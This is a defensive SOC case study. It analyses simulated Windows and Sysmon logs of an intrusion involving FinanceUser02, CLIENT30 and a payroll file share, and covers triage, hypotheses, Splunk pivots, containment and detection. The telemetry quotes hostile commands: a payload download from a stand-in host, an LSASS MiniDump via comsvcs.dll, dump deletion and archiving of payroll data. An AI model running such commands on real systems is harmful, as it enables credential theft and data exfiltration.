
# SOC Investigation Case Study: The Missing Beginning

## Overview

This case study simulates a SOC investigation in which the beginning of an attack is not fully visible in the available telemetry.

The objective was to investigate a sequence of Windows events involving:

* `FinanceUser02`
* `CLIENT31`
* `CLIENT30`
* `DC01`
* `FILESERVER01`

The investigation required distinguishing legitimate user activity from suspicious behavior, identifying the first meaningful indicators of compromise, reconstructing the attack chain, and clearly separating **confirmed evidence from hypotheses**.

A key challenge in this investigation was that the telemetry begins **after the potential initial compromise**. This means the investigation cannot definitively establish how the attacker first obtained access.

---

# Investigation Scenario

The available telemetry is presented below in chronological order.

## Full Telemetry Under Investigation

```text
09:11:04  CLIENT30
4624
Account: FinanceUser02
Logon Type: 2

09:11:19  CLIENT30
4688
OUTLOOK.EXE

09:12:03  CLIENT30
4688
EXCEL.EXE
Command:
"C:\Finance\Budget2026.xlsx"

09:14:17  CLIENT30
4104
Get-Date

09:16:42  CLIENT30
4624
Account: FinanceUser02
Logon Type: 3
Source: CLIENT31

09:16:49  CLIENT30
4688
powershell.exe
Parent: wsmprovhost.exe

09:17:03  CLIENT30
4104
Get-Process

09:17:22  CLIENT30
4104
Get-ADComputer -Filter *

09:17:41  DC01
4769
Account: FinanceUser02
Service:
ldap/DC01

09:18:05  CLIENT30
4104
Get-ADGroupMember "Domain Admins"

09:18:47  CLIENT30
Sysmon 3
powershell.exe
→ 91.198.174.21
Port: 443

09:19:02  CLIENT30
4104
Invoke-WebRequest
https://cdn-example.net/agent.exe

09:19:11  CLIENT30
Sysmon 11
File Created:
C:\ProgramData\agent.exe

09:19:38  CLIENT30
4688
agent.exe
Parent:
powershell.exe

09:20:02  CLIENT30
Sysmon 3
agent.exe
→ 91.198.174.21
Port: 443

09:21:15  CLIENT30
4688
rundll32.exe

Command:
comsvcs.dll, MiniDump
612
C:\ProgramData\lsass.dmp
full

09:21:21  CLIENT30
Sysmon 11
File Created:
C:\ProgramData\lsass.dmp

09:21:36  CLIENT30
4104
Remove-Item
C:\ProgramData\lsass.dmp

09:22:07  DC01
4769
Account: FinanceUser02
Service:
cifs/FILESERVER01

09:22:15  FILESERVER01
4624
Account: FinanceUser02
Logon Type: 3
Source: CLIENT30

09:22:43  FILESERVER01
4663
Object:
\\FILESERVER01\Finance\Payroll2026.xlsx

Access:
ReadData

09:23:04  FILESERVER01
4663
Object:
\\FILESERVER01\Finance\Payroll2026.xlsx

Access:
WriteData

09:23:51  CLIENT30
4688
powershell.exe

Compress-Archive
C:\Users\FinanceUser02\Downloads\Payroll2026.xlsx
C:\Users\FinanceUser02\Downloads\Payroll.zip

09:24:13  CLIENT30
Sysmon 3
powershell.exe
→ 91.198.174.21
Port: 443
```

---

# 1. Where Does Legitimate Activity End?

My assessment is that the last event I would consider **potentially legitimate** is:

```text
09:17:41
DC01
4769
Account: FinanceUser02
Service: ldap/DC01
```

The preceding activity can reasonably fit normal administrative or user troubleshooting behavior:

```text
FinanceUser02
      ↓
CLIENT30
      ↓
PowerShell
      ↓
Get-Date
      ↓
Get-Process
      ↓
Get-ADComputer -Filter *
```

The `4769` LDAP service ticket is also not inherently malicious. Active Directory queries can legitimately generate Kerberos service ticket activity.

However, immediately afterward we see:

```text
09:18:05
Get-ADGroupMember "Domain Admins"
```

The context changes significantly at this point.

The account is a finance user, yet it is querying membership of the highly privileged **Domain Admins** group shortly before making an outbound connection and downloading an executable.

Therefore, I treat the activity after the LDAP ticket as increasingly suspicious rather than assuming that the LDAP event itself represents compromise.

---

# 2. First Genuine Suspicion

My first significant point of suspicion is:

```text
09:18:05
CLIENT30
4104

Get-ADGroupMember "Domain Admins"
```

The command itself is not inherently malicious.

A legitimate administrator may need to determine group membership during troubleshooting or security administration.

The concern comes from the **sequence and context**:

```text
Get-ADComputer -Filter *
        ↓
Get-ADGroupMember "Domain Admins"
        ↓
Outbound connection
        ↓
Invoke-WebRequest
        ↓
agent.exe
```

The combination suggests systematic reconnaissance followed by potential payload delivery.

At this stage, I would classify the activity as:

## Suspicious

I would continue monitoring and investigating rather than immediately declaring an incident.

---

# 3. When Does This Become an Incident?

The incident threshold is crossed at:

```text
09:19:38
CLIENT30

4688
agent.exe
Parent:
powershell.exe
```

By this point, the evidence is no longer limited to reconnaissance.

We have a clear execution chain:

```text
PowerShell
     ↓
Invoke-WebRequest
     ↓
agent.exe created
     ↓
agent.exe executed
```

The executable was downloaded from an external location:

```text
https://cdn-example.net/agent.exe
```

and subsequently executed.

This provides significantly stronger evidence of malicious activity than the earlier discovery commands.

The incident becomes even more compelling when `agent.exe` immediately communicates with:

```text
91.198.174.21:443
```

This creates a behavioral chain consistent with:

```text
Reconnaissance
      ↓
Payload download
      ↓
Payload execution
      ↓
External communication
```

At this point, I would formally escalate the investigation as a security incident.

---

# 4. The Missing Beginning

One of the most important aspects of this investigation is that the available telemetry does **not** show how the attacker initially obtained access.

At:

```text
09:16:42
CLIENT30
4624
Account: FinanceUser02
Logon Type: 3
Source: CLIENT31
```

we observe a network logon to CLIENT30 originating from CLIENT31.

Immediately afterward:

```text
09:16:49
powershell.exe
Parent: wsmprovhost.exe
```

This suggests PowerShell execution through a remote management context.

However, this does not by itself prove that CLIENT31 was compromised.

---

# Initial Hypotheses

I would investigate several possibilities.

### Hypothesis 1 — FinanceUser02 Credentials Were Compromised

This is my leading hypothesis.

The attacker may have obtained FinanceUser02 credentials before the beginning of the available telemetry and subsequently used them from CLIENT31 to access CLIENT30.

This would explain:

```text
CLIENT31
    ↓
FinanceUser02 credentials
    ↓
CLIENT30
    ↓
PowerShell
```

### Hypothesis 2 — CLIENT31 Was Compromised

CLIENT31 may have been compromised first, with the attacker using it as a staging point to access CLIENT30.

Evidence currently available is insufficient to confirm this.

### Hypothesis 3 — Legitimate Remote Administration

It is also possible that a legitimate remote administrative session occurred from CLIENT31.

However, this hypothesis becomes increasingly difficult to sustain once the session is followed by:

* Domain Admin enumeration
* External network communication
* Payload download
* Payload execution
* LSASS dumping
* File server access
* Payroll data modification

Therefore, I would investigate the legitimacy of the original remote session rather than assume it was malicious from the beginning.

---

# 5. Reconstructing the Attack Chain

The available evidence supports the following attack narrative:

```text
Potential prior compromise / credential theft
                    ↓
              CLIENT31
                    ↓
        FinanceUser02 credentials
                    ↓
              CLIENT30
                    ↓
        Remote PowerShell execution
                    ↓
       Active Directory discovery
                    ↓
      Domain Admin enumeration
                    ↓
        External communication
                    ↓
       PowerShell payload download
                    ↓
             agent.exe
                    ↓
          Payload execution
                    ↓
       External communication
                    ↓
          LSASS memory dump
                    ↓
        Dump file deletion
                    ↓
         FILESERVER01 access
                    ↓
      Payroll2026.xlsx read/write
                    ↓
          Archive creation
                    ↓
      Possible data exfiltration
```

The final stage should remain classified as **potential exfiltration**, not confirmed exfiltration.

The final outbound connection to `91.198.174.21:443` occurs after the archive is created, but the telemetry provided does not demonstrate that `Payroll.zip` was actually transmitted.

That distinction is important during an investigation.

---

# 6. Credential Access

At:

```text
09:21:15
rundll32.exe

comsvcs.dll, MiniDump
612
C:\ProgramData\lsass.dmp
full
```

the investigation reaches another major escalation point.

The command attempts to create a full memory dump of the LSASS process.

LSASS is responsible for important Windows authentication functionality, making LSASS memory a high-value target for credential theft.

The subsequent telemetry confirms the dump file was created:

```text
09:21:21
Sysmon Event 11

C:\ProgramData\lsass.dmp
```

The attacker then attempted to remove the evidence:

```text
09:21:36
Remove-Item
C:\ProgramData\lsass.dmp
```

This represents strong evidence of credential-access activity followed by possible defense evasion.

---

# 7. Access to Sensitive Data

The attacker subsequently requested access to:

```text
FILESERVER01
```

The authentication sequence was:

```text
DC01
4769
cifs/FILESERVER01
        ↓
FILESERVER01
4624
Logon Type 3
Source: CLIENT30
```

The attacker then accessed:

```text
\\FILESERVER01\Finance\Payroll2026.xlsx
```

with:

```text
ReadData
```

followed by:

```text
WriteData
```

This is particularly important because the activity has now progressed beyond endpoint compromise into access to potentially sensitive business information.

The `WriteData` event also warrants investigation into what was changed and whether the file was modified maliciously.

---

# 8. Potential Data Exfiltration

The attacker subsequently created:

```text
Payroll.zip
```

using:

```text
Compress-Archive
```

This is consistent with preparation of data for possible exfiltration.

The final telemetry shows:

```text
PowerShell
    ↓
91.198.174.21:443
```

However, I would **not state that exfiltration was confirmed** based on these events alone.

I would investigate:

* Proxy logs
* Firewall logs
* Network flow telemetry
* EDR network telemetry
* TLS inspection where available
* DNS activity
* The actual archive file
* Destination reputation
* Amount of data transmitted

The correct assessment at this stage is:

> **Potential data exfiltration requiring further investigation.**

---

# 9. First Splunk Search

My initial Splunk investigation would focus on the identity involved:

```text
FinanceUser02
```

I would search activity surrounding the earliest and latest observed events to determine what happened before the visible attack chain.

For example:

```spl
index=wineventlog
Account_Name="FinanceUser02"
earliest=-4h latest=+2h
| table _time host EventCode Account_Name Logon_Type Source_Network_Address Process_Command_Line
| sort _time
```

Depending on the field normalization in the environment, I would adjust the account and source fields accordingly.

The objective is not simply to retrieve more logs.

The objective is to answer:

> **Where has FinanceUser02 authenticated, from which systems, and what did the account do before the attack became visible?**

---

# 10. Investigation Pivots

## Pivot 1 — LogonGUID

I would identify the network logon from CLIENT31 to CLIENT30:

```text
09:16:42
FinanceUser02
Type 3
Source: CLIENT31
```

I would then pivot using the associated `LogonGUID` where available.

This helps establish which events belong to the authentication session.

---

## Pivot 2 — ProcessGUID

After identifying the suspicious PowerShell execution and the downloaded payload, I would pivot using `ProcessGUID`.

This helps reconstruct process relationships such as:

```text
wsmprovhost.exe
       ↓
powershell.exe
       ↓
agent.exe
```

---

## Pivot 3 — Account + Source Host

Finally, I would search for:

```text
FinanceUser02
```

across:

* CLIENT31
* CLIENT30
* FILESERVER01
* DC01

This could reveal whether the account was being used from additional systems or whether this activity represents an abnormal authentication pattern.

---

# 11. Scope Assessment

It is important not to classify every system involved as "compromised."

## Confirmed Compromised

### CLIENT30

CLIENT30 is the primary confirmed compromised endpoint.

Evidence includes:

* Suspicious PowerShell activity
* External payload download
* `agent.exe` creation
* `agent.exe` execution
* External communication
* LSASS memory dumping
* Dump file deletion
* File server access
* Sensitive data access
* Archive creation

---

## Potentially Compromised

### CLIENT31

CLIENT31 is potentially compromised because it was the source of the network logon into CLIENT30 using FinanceUser02.

However, the available telemetry does not establish whether CLIENT31 itself was compromised.

I would therefore investigate it immediately rather than label it confirmed compromised.

---

## Affected Systems

### FILESERVER01

FILESERVER01 should be considered affected because compromised credentials were used to access a sensitive finance file.

However, there is currently insufficient evidence to conclude that FILESERVER01 itself was compromised.

The distinction is:

```text
CLIENT30
Confirmed compromised

CLIENT31
Potentially compromised

FILESERVER01
Affected by unauthorized access
```

This distinction is important when communicating incident scope to management.

---

# 12. Immediate Containment

Given the evidence, I would prioritize containment as follows.

### 1. Isolate CLIENT30

CLIENT30 is actively compromised and has executed a payload.

Network isolation would limit:

* Further command and control
* Lateral movement
* Credential theft
* Additional data access
* Potential exfiltration

---

### 2. Disable or Restrict FinanceUser02

Temporarily disable the account or otherwise restrict authentication while the investigation determines whether its credentials were compromised.

I would also:

* Revoke active sessions
* Reset the password
* Invalidate existing authentication tokens where supported
* Require MFA where applicable
* Investigate where the account authenticated

---

### 3. Protect FILESERVER01

Restrict unnecessary access to the Finance share while preserving evidence.

I would also investigate the modified:

```text
Payroll2026.xlsx
```

to determine:

* What changed
* Who changed it
* Whether malicious content was introduced
* Whether the modification can be attributed to the attacker

---

### 4. Investigate CLIENT31

CLIENT31 should immediately become a priority investigative target.

I would determine:

* Who was logged into CLIENT31
* Whether FinanceUser02 was legitimately being used
* Whether PowerShell was executed
* Whether remote administration tools were used
* Whether credential theft occurred
* Whether suspicious network connections originated from CLIENT31
* What happened before 09:16:42

---

# 13. Additional Telemetry I Would Investigate

I would collect and correlate:

### Authentication telemetry

* Event ID 4624
* Event ID 4625
* Event ID 4672
* Kerberos 4768
* Kerberos 4769

This helps establish authentication patterns and privilege use.

### PowerShell telemetry

* Event ID 4104
* PowerShell Operational logs
* Command-line telemetry
* Parent/child process relationships

This could reveal additional commands executed by the attacker.

### Sysmon telemetry

* Event ID 1 — Process creation
* Event ID 3 — Network connection
* Event ID 11 — File creation
* Event ID 22 — DNS queries

These can help reconstruct execution, network communication, payload creation, and destination resolution.

### Endpoint telemetry

I would also investigate EDR alerts and endpoint observations on CLIENT30 and CLIENT31 for:

* Credential dumping
* Malware execution
* Persistence
* Privilege escalation
* Additional payloads
* Suspicious child processes

---

# 14. Lessons Learned

Several detection opportunities exist within this attack chain.

### Identity-based detection

A finance user querying:

```text
Get-ADGroupMember "Domain Admins"
```

should receive additional scrutiny when it occurs outside normal administrative workflows.

### Remote PowerShell monitoring

A network logon followed by:

```text
wsmprovhost.exe
    ↓
powershell.exe
```

should be correlated with the account, source workstation, and expected administrative activity.

### Payload execution detection

A sequence such as:

```text
Invoke-WebRequest
      ↓
Sysmon Event 11
      ↓
New executable
      ↓
Sysmon Event 1
      ↓
External connection
```

is highly valuable for automated detection.

### Credential dumping detection

Execution involving:

```text
rundll32.exe
comsvcs.dll
MiniDump
```

should receive high priority because of its relationship to LSASS memory dumping.

### Sensitive file monitoring

Read/write access to high-value finance files should be correlated with:

* User identity
* Source workstation
* Authentication type
* Recent endpoint activity
* Network activity

---

# 15. Key SOC Takeaways

This investigation reinforced several important SOC principles.

### 1. Suspicious does not mean compromised

The first suspicious command was:

```text
Get-ADGroupMember "Domain Admins"
```

but the command alone was not sufficient to declare an incident.

### 2. Context matters

The same PowerShell command can be legitimate in one context and highly suspicious in another.

### 3. Missing telemetry creates uncertainty

Because the beginning of the compromise was not visible, the investigation had to distinguish between:

**What we know**

and

**What we suspect.**

### 4. Correlation is more powerful than isolated events

The individual events become much more meaningful when connected:

```text
Network Logon
      ↓
Remote PowerShell
      ↓
AD Discovery
      ↓
Payload Download
      ↓
Payload Execution
      ↓
C2 Communication
      ↓
LSASS Dump
      ↓
Defense Evasion
      ↓
File Server Access
      ↓
Sensitive Data Access
      ↓
Archive Creation
      ↓
Potential Exfiltration
```

### 5. Scope must be precise

A system can be:

* Confirmed compromised
* Potentially compromised
* Affected by unauthorized activity

These classifications should not be treated as interchangeable.

---

# Conclusion

This investigation was designed to simulate a realistic SOC scenario where the initial stage of an attack is missing from the available telemetry.

The investigation began with activity that could potentially be legitimate but gradually escalated into a clear compromise involving:

* Active Directory reconnaissance
* Remote PowerShell
* External payload delivery
* Malware execution
* Command-and-control communication
* LSASS credential dumping
* Defense evasion
* File server access
* Sensitive payroll data access
* Archive creation
* Potential data exfiltration

The most important lesson from this exercise was not simply identifying malicious commands.

It was learning to **build an evidence-based attack narrative while clearly separating confirmed facts from investigative hypotheses**.

That is a core skill in practical SOC analysis.

---

## Skills Demonstrated

* Splunk SIEM investigation
* Windows Event Log analysis
* PowerShell 4104 analysis
* Process-chain reconstruction
* Logon investigation
* Kerberos telemetry analysis
* Sysmon analysis
* Credential-access detection
* Lateral movement investigation
* Data-access investigation
* Incident classification
* Scope assessment
* Containment planning
* Threat hunting
* Evidence-based incident reporting

---

## Author

**Precious Anyanwu**

Entry-Level SOC Analyst | Cloud Security | CompTIA Security+ | AWS Certified | ISC2 CC

[GitHub](https://github.com/precious-anyanwu)
